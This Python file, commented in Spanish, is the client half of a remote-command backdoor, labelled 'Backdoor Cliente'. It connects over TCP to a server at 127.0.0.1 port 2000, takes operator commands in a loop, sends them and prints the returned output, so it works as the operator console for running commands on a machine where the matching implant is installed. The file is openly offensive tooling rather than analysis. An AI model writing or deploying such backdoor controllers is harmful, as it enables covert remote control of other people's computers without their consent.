"""
Uso: Backdoor Cliente
Creador: Andrés Hernández Mata
Version: 2.2.0
Python: 3.9.1
Fecha: 08 Abril 2020
"""

import socket
import sys
import os
from colorama import Fore
from colorama import Style

os.system("cls")

servidor = ("127.0.0.1", 2000)
bufferSize = 1024

try:
    TCPClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPClientSocket.connect(servidor)
    print("[+] Estableciendo Conexión...")
    while True:
        print("[+] Ingresar Comando...")
        comando = input("> ")
        if comando == "exit":
            comando = comando.encode()
            TCPClientSocket.send(comando)
            TCPClientSocket.close()
            print("[+] Cerrando Conexion...")    
            print("[+] Saliendo...")
            print("[-] Bye...")
            sys.exit()
        else:
            os.system("cls")
            print("[+] Enviando Comando...")
            comando = comando.encode()
            TCPClientSocket.send(comando)
            salida = TCPClientSocket.recv(bufferSize)
            print("[+] Espere...")        
            salida = salida.decode()
            print("[+] Salida...")
            print(salida)
except Exception:    
    print(Fore.RED + "Ocurrio una excepción en la conexion del servidor" + Style.RESET_ALL)


